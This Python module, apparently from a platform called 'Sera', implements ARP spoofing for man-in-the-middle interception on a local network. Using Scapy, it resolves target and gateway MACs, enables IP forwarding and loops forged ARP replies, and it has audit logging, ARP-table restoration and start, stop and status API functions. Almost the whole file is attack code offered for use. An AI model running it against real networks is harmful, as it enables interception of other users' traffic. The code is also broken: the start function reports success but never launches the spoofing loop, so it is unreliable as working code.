#!/usr/bin/env python3
"""
arp_spoof.py - ARP spoofing (local network only)
MERGED FROM JULIUS → SERA PLATFORM
Integration with Sera authentication, audit, and database
"""

import time
import logging
import json
import sys
from datetime import datetime
from typing import Optional, Dict, Any
from pathlib import Path

# Add Sera paths
SERA_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(SERA_ROOT))

try:
    from scapy.all import ARP, Ether, srp, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("WARNING: Scapy not available. ARP spoofing disabled.")

# Sera-specific imports
try:
    from config import settings
    SERA_CONFIG = settings
except ImportError:
    SERA_CONFIG = None

# Setup Sera logging
LOG_DIR = SERA_ROOT / "logs"
LOG_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / 'sera_arp_spoof.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("sera_arp_spoof")

class SeraARPSpoofer:
    """ARP spoofing with Sera integration"""
    
    def __init__(self):
        self.is_running = False
        self.active_spoofs = []
        self.spoof_history = []
        
        # Sera components
        self.db = self._init_database()
        self.auth = self._init_auth()
        self.audit = self._init_audit()
        
        logger.info("Sera ARP Spoofer initialized")
    
    def _init_database(self):
        """Initialize Sera database"""
        try:
            from database.db import get_db
            return get_db()
        except ImportError:
            logger.warning("Database not available - using memory storage")
            return None
    
    def _init_auth(self):
        """Initialize Sera authentication"""
        try:
            from security.auth import get_current_user
            return get_current_user
        except ImportError:
            logger.warning("Auth not available - development mode")
            return None
    
    def _init_audit(self):
        """Initialize Sera audit logging"""
        try:
            from services.audit_service import log_activity
            return log_activity
        except ImportError:
            logger.warning("Audit service not available - using local logging")
            return None
    
    def enable_ip_forwarding(self) -> bool:
        """Enable IP forwarding (required for MITM)"""
        try:
            import subprocess
            if sys.platform == "win32":
                # Windows: Modify registry
                # This is a simplified version - on Windows, you might need more complex handling
                logger.warning("IP forwarding on Windows requires manual configuration")
                return False
            else:
                # Linux/macOS
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
                logger.info("IP forwarding enabled")
                return True
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
            return False
    
    def get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for an IP"""
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available")
            return None
            
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            result = srp(packet, timeout=2, verbose=False)[0]
            if result:
                return result[0][1].hwsrc
        except Exception as e:
            logger.error(f"Error getting MAC: {e}")
        return None
    
    def arp_spoof(self, target_ip: str, gateway_ip: str, 
                  interface: Optional[str] = None,
                  user_id: Optional[str] = None) -> Dict[str, Any]:
        """Perform ARP spoofing"""
        if not SCAPY_AVAILABLE:
            return {"success": False, "error": "Scapy not available"}
        
        if self.is_running:
            return {"success": False, "error": "ARP spoofing already running"}
        
        interface = interface or "eth0"
        logger.info(f"Target: {target_ip}, Gateway: {gateway_ip}")
        
        # Enable IP forwarding
        if not self.enable_ip_forwarding():
            logger.warning("IP forwarding not enabled - MITM may not work")
        
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        
        if not target_mac or not gateway_mac:
            logger.error("Could not get MAC addresses")
            return {"success": False, "error": "MAC address resolution failed"}
        
        logger.info(f"Target MAC: {target_mac}")
        logger.info(f"Gateway MAC: {gateway_mac}")
        
        # Store spoof info
        spoof_info = {
            "target_ip": target_ip,
            "target_mac": target_mac,
            "gateway_ip": gateway_ip,
            "gateway_mac": gateway_mac,
            "interface": interface,
            "started_at": datetime.now().isoformat(),
            "user_id": user_id or "system"
        }
        self.active_spoofs.append(spoof_info)
        
        # Audit log
        self._log_arp_spoof(spoof_info)
        
        # Start spoofing loop in background
        self.is_running = True
        return {
            "success": True,
            "target_ip": target_ip,
            "gateway_ip": gateway_ip,
            "target_mac": target_mac,
            "gateway_mac": gateway_mac,
            "message": "ARP spoofing started"
        }
    
    def _spoof_loop(self, target_ip: str, target_mac: str, 
                    gateway_ip: str, gateway_mac: str) -> None:
        """Internal spoofing loop"""
        try:
            logger.info("ARP spoofing running...")
            while self.is_running:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                time.sleep(2)
        except Exception as e:
            logger.error(f"Spoofing error: {e}")
            self.is_running = False
    
    def stop_spoofing(self) -> Dict[str, Any]:
        """Stop ARP spoofing and restore ARP tables"""
        if not self.is_running:
            return {"success": False, "error": "ARP spoofing not running"}
        
        self.is_running = False
        
        # Restore ARP tables for all active spoofs
        for spoof in self.active_spoofs:
            try:
                send(ARP(op=2, pdst=spoof['target_ip'], hwdst=spoof['target_mac'], 
                        psrc=spoof['gateway_ip'], hwsrc=spoof['gateway_mac']), verbose=False)
                send(ARP(op=2, pdst=spoof['gateway_ip'], hwdst=spoof['gateway_mac'], 
                        psrc=spoof['target_ip'], hwsrc=spoof['target_mac']), verbose=False)
                logger.info(f"ARP tables restored for {spoof['target_ip']}")
            except Exception as e:
                logger.error(f"Failed to restore ARP: {e}")
        
        self.spoof_history.extend(self.active_spoofs)
        self.active_spoofs.clear()
        
        logger.info("ARP spoofing stopped - tables restored")
        return {"success": True, "message": "ARP spoofing stopped"}
    
    def _log_arp_spoof(self, spoof_info: Dict[str, Any]):
        """Log ARP spoof to Sera audit"""
        try:
            if self.audit:
                self.audit(
                    action="arp_spoof_start",
                    target=spoof_info['target_ip'],
                    details=spoof_info
                )
            else:
                audit_file = LOG_DIR / f"arp_spoof_{datetime.now().strftime('%Y%m%d')}.log"
                with open(audit_file, 'a') as f:
                    f.write(json.dumps(spoof_info) + '\n')
        except Exception as e:
            logger.error(f"Error logging ARP spoof: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get ARP spoofing status"""
        return {
            "is_running": self.is_running,
            "active_spoofs": len(self.active_spoofs),
            "total_spoofs": len(self.spoof_history),
            "current_targets": [
                {"target": s['target_ip'], "gateway": s['gateway_ip']}
                for s in self.active_spoofs
            ]
        }

# Singleton for Sera
_spoofer_instance = None

def get_spoofer() -> SeraARPSpoofer:
    """Get or create spoofer instance"""
    global _spoofer_instance
    if _spoofer_instance is None:
        _spoofer_instance = SeraARPSpoofer()
    return _spoofer_instance

# Sera API Functions
def start_arp_spoof(target_ip: str, gateway_ip: str, 
                   interface: Optional[str] = None,
                   user_id: Optional[str] = None) -> Dict[str, Any]:
    """API: Start ARP spoofing"""
    spoofer = get_spoofer()
    return spoofer.arp_spoof(target_ip, gateway_ip, interface, user_id)

def stop_arp_spoof() -> Dict[str, Any]:
    """API: Stop ARP spoofing"""
    spoofer = get_spoofer()
    return spoofer.stop_spoofing()

def get_arp_status() -> Dict[str, Any]:
    """API: Get ARP spoofing status"""
    spoofer = get_spoofer()
    return {"status": "success", "data": spoofer.get_status()}

if __name__ == "__main__":
    print("Sera ARP Spoofer loaded")
